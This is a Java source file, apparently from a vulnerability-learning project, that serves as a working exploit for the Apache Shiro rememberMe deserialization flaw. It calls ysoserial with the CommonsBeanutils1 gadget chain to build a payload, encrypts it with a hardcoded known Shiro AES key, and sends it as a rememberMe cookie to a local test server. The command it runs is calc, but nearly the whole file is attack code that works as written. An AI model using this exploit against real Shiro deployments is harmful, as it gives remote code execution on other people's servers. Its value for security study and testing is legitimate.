package summersec.shirodemo.Payload;


import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileReader;
import cn.hutool.core.util.HexUtil;
import cn.hutool.core.util.URLUtil;
import cn.hutool.crypto.Mode;
import cn.hutool.crypto.Padding;
import cn.hutool.crypto.symmetric.AES;
import cn.hutool.http.HttpRequest;
import org.apache.shiro.codec.Base64;
import summersec.shirodemo.Encrypt.CbcEncrypt;
import summersec.shirodemo.Encrypt.Encrypt;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;


/**
 * @ClassName: Payload
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/1/16 15:08
 * @Version: v1.0.0
 * @Description:
 **/
public class Payload {

    public static void main(String[] args) throws Exception {
        // shiro key
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

        // ysoserial.jar 路径
        String ysoserial = "D:\\Tools\\反序列化\\ysoserial-0.0.6-SNAPSHOT-all.jar";
        // payload 生成文件路径
        String filepath = "E:\\Soures\\JavaLearnVulnerability\\shiro\\shiro-deser\\t.txt";

        String CMD = "java -jar " + ysoserial + " CommonsBeanutils1 calc>" + filepath;
        new Tools().exeCmd(CMD);
        FileReader fileReader = new FileReader(filepath);
        //  aes cbc加密
        CbcEncrypt cbcEncrypt = new CbcEncrypt();
        // payload cookie
        // 使用 cbcEncrypt 进行加密
        String cookie = "rememberMe=" + cbcEncrypt.encrypt(key,fileReader.readBytes());
//     使用 Encrypt 进行加密
//        String cookie = "rememberMe=" + Encrypt.encrypt(fileReader.readBytes(),DEFAULT_CIPHER_KEY_BYTES);

        System.out.println(cookie);
        String url = "http://127.0.0.1:8001/index";
        String result = HttpRequest.get(url).cookie(cookie).execute().body();
        System.out.println(result);
















    }


}
